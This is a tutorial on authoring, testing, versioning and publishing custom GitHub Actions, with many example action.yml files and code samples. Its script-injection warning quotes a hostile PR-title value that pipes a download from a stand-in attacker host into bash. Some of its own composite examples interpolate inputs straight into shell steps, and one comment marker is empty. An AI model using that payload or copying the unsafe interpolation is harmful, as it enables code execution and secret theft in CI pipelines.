Custom Actions

Go beyond consuming marketplace actions. Learn to build JavaScript, Docker, and composite actions from scratch, define metadata with action.yml, and publish reusable automation to the GitHub Marketplace.

~50 min Module Intermediate-Advanced

Learning Objectives

  • Distinguish between JavaScript, Docker container, and composite action types and select the right one for a given use case
  • Author a complete action.yml metadata file with inputs, outputs, branding, and runs configuration
  • Build a JavaScript action using the @actions/core and @actions/github toolkit packages
  • Create a Docker container action with a custom Dockerfile and entrypoint script
  • Compose multi-step composite actions that combine shell commands with other actions
  • Implement input validation, error handling, and output propagation across action types
  • Apply semantic versioning, SHA pinning, and release tagging strategies for action distribution
  • Publish an action to the GitHub Marketplace with proper branding, categories, and documentation

1. Why Build Custom Actions?

GitHub provides thousands of community actions on the Marketplace, but real-world teams inevitably need automation that doesn't exist yet. Custom actions let you encapsulate complex logic into a single reusable step — your team calls uses: your-org/your-action@v2 and the complexity disappears behind a clean interface of inputs and outputs.

Custom actions solve three problems that inline run: commands cannot:

Problem Inline run: Custom Action
Reusability Copy-paste across repos, drifts over time Single source of truth, versioned releases
Encapsulation Implementation details leak into every workflow Clean interface: inputs in, outputs out
Testing Hard to test YAML steps in isolation Unit-testable code with standard tooling
Distribution Requires shared scripts or template repos Marketplace listing, uses: one-liner
Actions vs Reusable Workflows

Actions operate at the step level — they run inside a job alongside other steps. Reusable workflows operate at the job level — they define entire jobs that callers invoke with workflow_call. Use actions for discrete tasks (lint, notify, deploy). Use reusable workflows for entire pipeline stages.

2. The Three Action Types

Every custom action is one of three types. Each type defines how the action's code is executed at runtime. The choice affects portability, performance, complexity, and what languages you can use.

Feature JavaScript Docker Container Composite
Runtime Node.js (v20 or v24) Any language in a container Shell commands + other actions
OS Support Linux, macOS, Windows Linux only Linux, macOS, Windows
Startup Speed Fast (no container build) Slow (builds/pulls image) Fast (no overhead)
Environment Isolation Shares runner environment Full container isolation Shares runner environment
Language JavaScript/TypeScript only Any (Python, Go, Rust, etc.) Any available shell
Complexity Medium (need bundler for deps) High (Dockerfile + entrypoint) Low (YAML only)
Best For API calls, data transforms, GitHub integrations Tools needing specific OS/deps Orchestrating existing actions + scripts
runs.using node20 or node24 docker composite
Decision Framework

Start with composite if your action is orchestration (running commands and existing actions in sequence). Choose JavaScript if you need to call APIs, process data, or interact with the GitHub context programmatically. Choose Docker only when you need a specific runtime (Python 3.12, Go 1.22) or system-level dependencies that the runner image doesn't provide.

3. The action.yml Metadata File

Every custom action — regardless of type — requires an action.yml (or action.yaml) file at its root. This metadata file defines the action's public interface: its name, description, inputs, outputs, branding, and execution configuration. Think of it as the contract between the action author and every workflow that consumes it.

Complete Metadata Structure

YAML — action.yml (full reference)
# Required: display name in the Actions tab and Marketplace
name: 'My Custom Action'

# Optional: author name
author: 'your-github-username'

# Required: short description (shown in Marketplace search)
description: 'A concise description of what this action does'

# Optional: input parameters the action accepts
inputs:
  api-token:
    description: 'API token for authentication'
    required: true
  environment:
    description: 'Target deployment environment'
    required: false
    default: 'staging'
  legacy-param:
    description: 'Deprecated - use environment instead'
    deprecationMessage: 'Use environment input instead'

# Optional: output values the action produces
outputs:
  deploy-url:
    description: 'The URL of the deployed application'
  status:
    description: 'Deployment status: success or failure'

# Required: how to run the action (type-specific)
runs:
  using: 'node20'
  main: 'dist/index.js'

# Optional: Marketplace branding
branding:
  icon: 'upload-cloud'
  color: 'blue'

Input Parameters in Detail

Inputs define the data consumers pass to your action via the with: keyword. Each input has an ID, description, and optional required/default fields.

Property Required Description
description Yes Human-readable description of the input
required No Boolean — but GitHub does NOT enforce it at runtime; your code must validate
default No Default value when the consumer omits the input
deprecationMessage No Warning message logged when the input is used
Common Gotcha: required Does Not Auto-Fail

Setting required: true in your metadata does not cause GitHub to automatically reject a workflow run if the input is missing. It is a documentation hint only. Your action code must explicitly check for the input and call core.setFailed() or exit with a non-zero code if validation fails.

Output Values

Outputs let your action pass data to subsequent steps. For JavaScript and Docker actions, you set outputs in code. For composite actions, you map outputs to specific step outputs using the value key.

YAML — Composite action outputs with value mapping
outputs:
  artifact-url:
    description: 'URL of the uploaded artifact'
    value: ${{ steps.upload.outputs.url }}
  build-hash:
    description: 'SHA256 hash of the build output'
    value: ${{ steps.hash.outputs.digest }}

Branding for the Marketplace

The branding section controls how your action appears in the GitHub Marketplace. You select from a predefined set of Feather icons and colors.

Property Options
color white, yellow, blue, green, orange, red, purple, gray-dark
icon Any Feather icon name: activity, airplay, alert-circle, upload-cloud, shield, terminal, package, zap, etc.

4. Building a JavaScript Action

JavaScript actions are the most common type. They run directly on the runner using Node.js, execute fast (no container overhead), and work on all three runner operating systems. The @actions/toolkit provides purpose-built packages for interacting with the workflow runtime.

Step 1: Project Setup

Shell — Initialize the action repository
mkdir my-js-action && cd my-js-action
git init
npm init -y

# Install the Actions toolkit
npm install @actions/core @actions/github

# Install bundler for distribution
npm install --save-dev rollup @rollup/plugin-commonjs @rollup/plugin-node-resolve

Step 2: Define action.yml

YAML — action.yml
name: 'PR Label Enforcer'
description: 'Ensures PRs have at least one required label before merge'

inputs:
  required-labels:
    description: 'Comma-separated list of label prefixes (e.g., type/, priority/)'
    required: true
  token:
    description: 'GitHub token for API access'
    required: false
    default: ${{ github.token }}

outputs:
  labels-found:
    description: 'Comma-separated list of matching labels found'
  missing-prefixes:
    description: 'Prefixes with no matching label'

runs:
  using: 'node20'
  main: 'dist/index.js'

branding:
  icon: 'tag'
  color: 'purple'

Step 3: Write the Action Code

JavaScript — src/index.js
import * as core from '@actions/core';
import * as github from '@actions/github';

try {
  // Read inputs defined in action.yml
  const requiredLabels = core.getInput('required-labels', { required: true });
  const token = core.getInput('token');

  // Parse the comma-separated prefixes
  const prefixes = requiredLabels.split(',').map(s => s.trim());
  core.info(`Checking for label prefixes: ${prefixes.join(', ')}`);

  // Get the PR context
  const { context } = github;
  if (!context.payload.pull_request) {
    core.setFailed('This action only works on pull_request events');
    process.exit(1);
  }

  // Fetch current PR labels via API
  const octokit = github.getOctokit(token);
  const { data: pr } = await octokit.rest.pulls.get({
    owner: context.repo.owner,
    repo: context.repo.repo,
    pull_number: context.payload.pull_request.number,
  });

  const labelNames = pr.labels.map(l => l.name);
  core.info(`PR labels: ${labelNames.join(', ')}`);

  // Check each required prefix
  const found = [];
  const missing = [];

  for (const prefix of prefixes) {
    const match = labelNames.find(l => l.startsWith(prefix));
    if (match) {
      found.push(match);
    } else {
      missing.push(prefix);
    }
  }

  // Set outputs for downstream steps
  core.setOutput('labels-found', found.join(','));
  core.setOutput('missing-prefixes', missing.join(','));

  // Fail if any required prefix is missing
  if (missing.length > 0) {
    core.setFailed(`Missing required label prefixes: ${missing.join(', ')}`);
  } else {
    core.info('All required label prefixes are present');
  }
} catch (error) {
  core.setFailed(error.message);
}

Step 4: Bundle for Distribution

GitHub downloads your action as a complete package at runtime. You must include all dependencies. The recommended approach is to bundle your code with a tool like rollup or @vercel/ncc into a single file.

JavaScript — rollup.config.js
import commonjs from '@rollup/plugin-commonjs';
import { nodeResolve } from '@rollup/plugin-node-resolve';

export default {
  input: 'src/index.js',
  output: {
    esModule: true,
    file: 'dist/index.js',
    format: 'es',
    sourcemap: true,
  },
  plugins: [commonjs(), nodeResolve({ preferBuiltins: true })],
};
Shell — Build and commit
# Bundle all dependencies into dist/index.js
npx rollup --config rollup.config.js

# Commit the bundled output (yes, dist/ is committed for actions)
git add action.yml src/ dist/ package.json
git commit -m "Initial action release"
git tag -a v1.0.0 -m "v1.0.0 - initial release"
git push --follow-tags

Toolkit Package Reference

@actions/core Essential

Read inputs, set outputs, log messages, set exit codes, export variables, manage secrets masking, create command groups

core.getInput('name') core.setOutput('key', value) core.setFailed('error msg')
@actions/github Essential

Authenticated Octokit REST/GraphQL client plus full webhook context (event payload, repo, actor, SHA)

const octokit = github.getOctokit(token); const { context } = github;
@actions/exec Utility

Execute shell commands with streaming stdout/stderr, exit code handling, and options for working directory and env vars

await exec.exec('npm', ['test']); await exec.getExecOutput('git', ['log']);
@actions/io Utility

File system operations: copy, move, remove, find executables on PATH, create directories recursively

await io.cp('src', 'dest', { recursive: true }); const path = await io.which('docker');
@actions/cache Advanced

Save and restore arbitrary file caches with composite keys. Same engine as actions/cache but callable from code.

const key = await cache.restoreCache(paths, key); await cache.saveCache(paths, key);
@actions/artifact Advanced

Upload and download workflow artifacts programmatically. Useful when your action produces files for downstream jobs.

const client = artifact.create(); await client.uploadArtifact(name, files, dir);

Lifecycle Hooks: pre and post

JavaScript actions support optional pre and post scripts that run before and after the main action. Use pre for setup (install tools, configure auth) and post for cleanup (revoke tokens, remove temp files).

YAML — action.yml with lifecycle hooks
runs:
  using: 'node20'
  pre: 'setup.js'           # Runs before main (e.g., download CLI tool)
  main: 'dist/index.js'     # The core action logic
  post: 'cleanup.js'        # Runs after main (e.g., revoke credentials)
  post-if: 'always()'      # Run cleanup even if main failed

5. Building a Docker Container Action

Docker container actions package your code with its entire runtime environment. This means you can use any language (Python, Go, Rust, Ruby) and install any system dependencies. The trade-off is slower execution (container build/pull) and Linux-only runner support.

Step 1: Create the Dockerfile

Dockerfile
# Use a minimal base image
FROM python:3.12-alpine

# Install any system dependencies
RUN apk add --no-cache git curl jq

# Install Python dependencies
COPY requirements.txt /requirements.txt
RUN pip install --no-cache-dir -r /requirements.txt

# Copy the action code
COPY entrypoint.py /entrypoint.py

# Make it executable
RUN chmod +x /entrypoint.py

# Set the entrypoint
ENTRYPOINT ["python", "/entrypoint.py"]

Step 2: Define action.yml

YAML — action.yml for Docker action
name: 'Security Scan Reporter'
description: 'Runs a security scan and posts results as a PR comment'

inputs:
  scan-path:
    description: 'Directory to scan'
    required: false
    default: '.'
  severity-threshold:
    description: 'Minimum severity to report (low, medium, high, critical)'
    required: false
    default: 'medium'

outputs:
  findings-count:
    description: 'Total number of findings at or above threshold'
  report-url:
    description: 'URL to the full scan report artifact'

runs:
  using: 'docker'
  image: 'Dockerfile'       # Build from local Dockerfile
  args:                        # Pass inputs as container arguments
    - ${{ inputs.scan-path }}
    - ${{ inputs.severity-threshold }}

branding:
  icon: 'shield'
  color: 'red'

Step 3: Write the Entrypoint

Python — entrypoint.py
import sys, os, json

# Docker actions receive inputs as args (from action.yml args:)
scan_path = sys.argv[1] if len(sys.argv) > 1 else '.'
severity = sys.argv[2] if len(sys.argv) > 2 else 'medium'

# Also available via environment: INPUT_SCAN-PATH, INPUT_SEVERITY-THRESHOLD
# (GitHub uppercases input names and prepends INPUT_)

print(f"Scanning {scan_path} for {severity}+ findings...")

# ... your scanning logic here ...
findings_count = 0  # placeholder

# Set outputs via GITHUB_OUTPUT file
with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
    f.write(f"findings-count={findings_count}\n")
    f.write(f"report-url=https://example.com/report\n")

# Exit with non-zero to fail the step
if findings_count > 0:
    print(f"::error::Found {findings_count} security issues")
    sys.exit(1)

Docker Image Options

image: value Behavior When to Use
'Dockerfile' Builds image from local Dockerfile each run During development, small images
'docker://alpine:3.19' Pulls a public image from Docker Hub Standard base images, quick prototypes
'docker://ghcr.io/org/img:v1' Pulls from GitHub Container Registry Pre-built images for faster execution
Performance Tip: Pre-built Images

Building from a Dockerfile on every run can add 30-120 seconds. For production actions, pre-build your Docker image in a CI workflow, push it to GHCR, and reference it with docker://ghcr.io/your-org/your-action:v1. This cuts startup time to a simple pull.

6. Building a Composite Action

Composite actions are the simplest type to create: they are pure YAML, require no build step, and can combine shell commands with calls to other actions. They are ideal for standardizing multi-step processes that your team repeats across repositories.

Composite Action Structure

YAML — action.yml for a composite action
name: 'Setup and Test Node Project'
description: 'Checks out code, installs deps, and runs tests with coverage'

inputs:
  node-version:
    description: 'Node.js version to use'
    required: false
    default: '20'
  working-directory:
    description: 'Directory containing package.json'
    required: false
    default: '.'

outputs:
  coverage-percentage:
    description: 'Test coverage percentage'
    value: ${{ steps.coverage.outputs.percentage }}

runs:
  using: 'composite'
  steps:
    # Composite actions can call other actions with 'uses'
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'

    # Composite actions can run shell commands with 'run'
    # IMPORTANT: 'shell' is required for every run step in composite actions
    - name: Install dependencies
      run: npm ci
      shell: bash
      working-directory: ${{ inputs.working-directory }}

    - name: Run tests with coverage
      run: npm test -- --coverage
      shell: bash
      working-directory: ${{ inputs.working-directory }}

    - name: Extract coverage
      id: coverage
      run: |
        PCT=$(grep -oP 'All files[^|]*\|\s*\K[0-9.]+' coverage/coverage-summary.json || echo '0')
        echo "percentage=$PCT" >> $GITHUB_OUTPUT
      shell: bash
      working-directory: ${{ inputs.working-directory }}

    - name: Upload coverage artifact
      uses: actions/upload-artifact@v4
      with:
        name: coverage-report
        path: ${{ inputs.working-directory }}/coverage/

Key Rules for Composite Actions

Rule Details
shell: is mandatory Every run: step must specify shell: bash, shell: pwsh, etc. Unlike regular workflows, it is not inherited.
No INPUT_* env vars Composite actions do NOT auto-create INPUT_* environment variables. Access inputs via ${{ inputs.name }} expressions.
Output mapping requires value: Unlike JS/Docker outputs, composite outputs must explicitly map to a step output using the value: key.
Can nest other actions Steps can use uses: to call marketplace or local actions, enabling powerful composition chains.
No lifecycle hooks Composite actions do not support pre: or post: scripts. Put setup/cleanup as explicit steps.

Local Composite Actions

You can define composite actions inside the same repository and reference them with a relative path. This is useful for monorepos where you want shared steps without publishing a separate action.

YAML — Using a local composite action
# File structure:
# .github/actions/setup-and-test/action.yml  (the composite action)
# .github/workflows/ci.yml                   (the workflow)

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # Reference local action by relative path
      - uses: ./.github/actions/setup-and-test
        with:
          node-version: '20'

      - run: echo "Coverage: ${{ steps.coverage.outputs.percentage }}%"

7. Inputs, Outputs, and Error Handling

How you handle data flow and errors depends on your action type. Each type has a different mechanism for reading inputs, setting outputs, and signaling failure.

Input Access Patterns

Action Type How to Read Inputs Example
JavaScript core.getInput('name') const token = core.getInput('token', { required: true });
Docker Environment: INPUT_NAME or args echo $INPUT_WHO_TO_GREET or sys.argv[1]
Composite Expression: ${{ inputs.name }} run: echo ${{ inputs.node-version }}

Output Setting Patterns

Action Type How to Set Outputs
JavaScript core.setOutput('key', 'value')
Docker echo "key=value" >> $GITHUB_OUTPUT
Composite echo "key=value" >> $GITHUB_OUTPUT in a step, then map with value: in metadata outputs

Error Handling Patterns

Action Type Fail the Step Warn Without Failing
JavaScript core.setFailed('message') core.warning('message')
Docker exit 1 / sys.exit(1) echo "::warning::message"
Composite Any step exits non-zero echo "::warning::message"
Workflow Commands

All action types can use workflow commands by writing to stdout: ::error::msg, ::warning::msg, ::notice::msg, ::debug::msg, ::group::title / ::endgroup::. These work in any language, any shell.

8. Testing Your Action

Actions are code, and code needs tests. Testing strategies differ by action type, but all actions should have both unit tests and integration tests.

Unit Testing a JavaScript Action

JavaScript — __tests__/index.test.js (Jest)
import * as core from '@actions/core';

// Mock the toolkit to avoid real API calls
jest.mock('@actions/core');
jest.mock('@actions/github', () => ({
  getOctokit: jest.fn(() => ({
    rest: {
      pulls: {
        get: jest.fn().mockResolvedValue({
          data: {
            labels: [
              { name: 'type/feature' },
              { name: 'priority/high' },
            ],
          },
        }),
      },
    },
  })),
  context: {
    repo: { owner: 'test-org', repo: 'test-repo' },
    payload: { pull_request: { number: 42 } },
  },
}));

test('passes when all required label prefixes exist', async () => {
  core.getInput.mockReturnValueOnce('type/, priority/');
  core.getInput.mockReturnValueOnce('fake-token');

  await require('../src/index.js');

  expect(core.setFailed).not.toHaveBeenCalled();
  expect(core.setOutput).toHaveBeenCalledWith('labels-found', 'type/feature,priority/high');
});

test('fails when a required label prefix is missing', async () => {
  core.getInput.mockReturnValueOnce('type/, status/');
  core.getInput.mockReturnValueOnce('fake-token');

  await require('../src/index.js');

  expect(core.setFailed).toHaveBeenCalledWith(
    expect.stringContaining('status/')
  );
});

9. Versioning and Release Strategy

How you version your action determines how consumers pin to specific releases and receive updates. GitHub Actions supports three referencing strategies, each with different trade-offs between stability and freshness.

Reference Strategies

Strategy Syntax Stability Freshness
SHA Pin uses: owner/action@a1b2c3d4... Immutable — highest security Manual update required
Semantic Version Tag uses: owner/action@v2.1.0 Locked to exact release Manual update for patches
Major Version Tag uses: owner/action@v2 May receive minor/patch changes Auto-receives non-breaking updates

Recommended Release Process

1. Tag Create a semantic version tag: git tag -a v2.1.0 -m "Add input validation"
2. Release Create a GitHub Release from the tag with changelog notes
3. Float Move the major version tag: git tag -fa v2 -m "Update v2 to v2.1.0"
4. Push git push origin v2.1.0 && git push origin v2 --force
Shell — Release workflow for action versioning
# Create and push the exact version tag
git tag -a v2.1.0 -m "v2.1.0: Add input validation and error messages"
git push origin v2.1.0

# Move the floating major version tag
# This is a force-push because v2 already exists from v2.0.0
git tag -fa v2 -m "Update v2 tag to v2.1.0"
git push origin v2 --force

# Now consumers using @v2 automatically get v2.1.0
# Consumers using @v2.0.0 stay on the old version
# Consumers using @SHA are always locked
Security: SHA Pinning in Production

For production workflows, always pin third-party actions to a full commit SHA, not a tag. Tags are mutable — a compromised action repository could move a tag to point to malicious code. Tools like StepSecurity and Dependabot can automate SHA pinning and update notifications.

10. Publishing to GitHub Marketplace

Publishing to the Marketplace makes your action discoverable to the entire GitHub community. Actions are published immediately without review, as long as they meet the requirements.

Pre-Publication Checklist

Repository Must be public. Contains a single action.yml at the root.
Metadata name must be unique across the Marketplace. Cannot match existing users, orgs, or categories.
Branding Include branding.icon and branding.color in action.yml for a professional listing.
README Comprehensive README with description, all inputs/outputs, usage examples, and version info.
No Workflows The repository must not contain workflow files in .github/workflows/ (except for testing the action itself).
Agreement Repository owner must accept the GitHub Marketplace Developer Agreement.

Publishing Steps

Steps — Publishing to the Marketplace
1. Navigate to your action repository on GitHub
2. Open the action.yml file - you'll see a banner:
   "Publish this action to the GitHub Marketplace"
3. Click "Draft a release"
4. Check "Publish this Action to the GitHub Marketplace"
5. Select a Primary Category (e.g., "Continuous Integration")
6. Optionally select a secondary category
7. Enter a version tag (e.g., v1.0.0)
8. Write release notes describing what the action does
9. Click "Publish release"
   (requires 2FA enabled on your account)

11. Action Security Best Practices

Custom actions often handle secrets, API tokens, and repository access. A vulnerability in a popular action can compromise thousands of downstream repositories. Security must be built in from the start.

For Action Authors

Validate All Inputs Critical

Never trust consumer-provided inputs. Sanitize values used in shell commands to prevent injection attacks. Use core.getInput() and validate before interpolation.

Minimize Permissions Critical

Document the minimum permissions: your action needs. Never request contents: write unless you actually modify the repo.

Pin Dependencies High

Use exact versions in package.json and Dockerfile. Pin base images to SHA digests. Enable Dependabot for automated updates.

Mask Secrets High

If your action receives or generates secrets, use core.setSecret(value) to mask them in logs. Never write secrets to outputs.

For Action Consumers

YAML — Secure action consumption
steps:
  # Pin to full SHA, not a mutable tag
  - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0

  # Set minimum permissions at the workflow or job level
  # Only grant what's actually needed

  # Review the action's source code before first use
  # Check: Does it phone home? Does it exfiltrate secrets?
  # Check: Is the repository actively maintained?

  # For org-critical workflows, fork the action
  # and reference your fork
  - uses: your-org/forked-action@v2
Script Injection Warning

Never interpolate untrusted context values directly into run: commands. An attacker who controls the PR title or branch name could inject shell commands. Use environment variables instead:

YAML — Vulnerable vs safe patterns
# VULNERABLE - PR title could contain: "; curl evil.com/steal | bash
- run: echo "PR: ${{ github.event.pull_request.title }}"

# SAFE - use an intermediate environment variable
- run: echo "PR: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}

12. Real-World Custom Action Patterns

These patterns appear repeatedly in production-grade custom actions. Study them to understand how the three action types solve common automation challenges.

Pattern 1: Composite Deployment Gate

A composite action that bundles approval checks, environment validation, and deploy notification into a single reusable step.

YAML — action.yml (deployment gate)
name: 'Deploy Gate'
description: 'Validates deployment prerequisites before proceeding'

inputs:
  environment:
    description: 'Target environment'
    required: true
  health-url:
    description: 'Health check endpoint'
    required: true
  slack-webhook:
    description: 'Slack webhook for notifications'
    required: false

outputs:
  previous-version:
    description: 'Version currently deployed'
    value: ${{ steps.health.outputs.version }}

runs:
  using: 'composite'
  steps:
    - name: Check current deployment health
      id: health
      run: |
        RESPONSE=$(curl -sf "${{ inputs.health-url }}" || echo '{}')
        VERSION=$(echo "$RESPONSE" | jq -r '.version // "unknown"')
        echo "version=$VERSION" >> $GITHUB_OUTPUT
        echo "Current deployed version: $VERSION"
      shell: bash

    - name: Notify deployment start
      if: ${{ inputs.slack-webhook != '' }}
      run: |
        curl -sf -X POST "${{ inputs.slack-webhook }}" \
          -H 'Content-Type: application/json' \
          -d "{\"text\":\"Deploying to ${{ inputs.environment }}...\"}"
      shell: bash

Pattern 2: JavaScript PR Commenter

A JavaScript action that posts or updates a comment on a PR with build results, avoiding duplicate comments on re-runs.

JavaScript — src/index.js (PR commenter)
import * as core from '@actions/core';
import * as github from '@actions/github';

const MARKER = '';

async function run() {
  const token = core.getInput('token', { required: true });
  const body = core.getInput('body', { required: true });
  const octokit = github.getOctokit(token);
  const { context } = github;

  const prNumber = context.payload.pull_request?.number;
  if (!prNumber) return core.setFailed('Not a PR event');

  // Find existing comment from this action
  const { data: comments } = await octokit.rest.issues.listComments({
    ...context.repo, issue_number: prNumber,
  });
  const existing = comments.find(c => c.body?.includes(MARKER));

  const fullBody = `${MARKER}\n${body}`;

  if (existing) {
    // Update existing comment instead of creating duplicates
    await octokit.rest.issues.updateComment({
      ...context.repo, comment_id: existing.id, body: fullBody,
    });
    core.info(`Updated comment ${existing.id}`);
  } else {
    await octokit.rest.issues.createComment({
      ...context.repo, issue_number: prNumber, body: fullBody,
    });
    core.info('Created new comment');
  }
}

run().catch(err => core.setFailed(err.message));

Pattern 3: Monorepo Change Detector (Composite)

YAML — Detect which services changed in a monorepo
name: 'Monorepo Change Detector'
description: 'Outputs which services changed based on git diff'

inputs:
  services:
    description: 'JSON array of service paths, e.g., ["apps/api","apps/web"]'
    required: true
  base-ref:
    description: 'Base branch for comparison'
    default: 'origin/main'

outputs:
  changed:
    description: 'JSON array of changed service paths'
    value: ${{ steps.detect.outputs.changed }}
  matrix:
    description: 'Matrix-compatible JSON for dynamic job generation'
    value: ${{ steps.detect.outputs.matrix }}

runs:
  using: 'composite'
  steps:
    - name: Detect changes
      id: detect
      run: |
        CHANGED=()
        for SERVICE in $(echo '${{ inputs.services }}' | jq -r '.[]'); do
          if git diff --name-only ${{ inputs.base-ref }}...HEAD | grep -q "^${SERVICE}/"; then
            CHANGED+=("\"${SERVICE}\"")
          fi
        done
        JSON="[$(IFS=,; echo "${CHANGED[*]}")]"
        echo "changed=$JSON" >> $GITHUB_OUTPUT
        echo "matrix={\"service\":$JSON}" >> $GITHUB_OUTPUT
      shell: bash
Action Development Principles

Keep actions focused: one action, one job. Fail loudly: validate inputs early and provide clear error messages. Document thoroughly: every input, output, and edge case. Version carefully: follow semantic versioning and maintain floating major tags. Test at both levels: unit tests for logic, integration tests with real workflows.
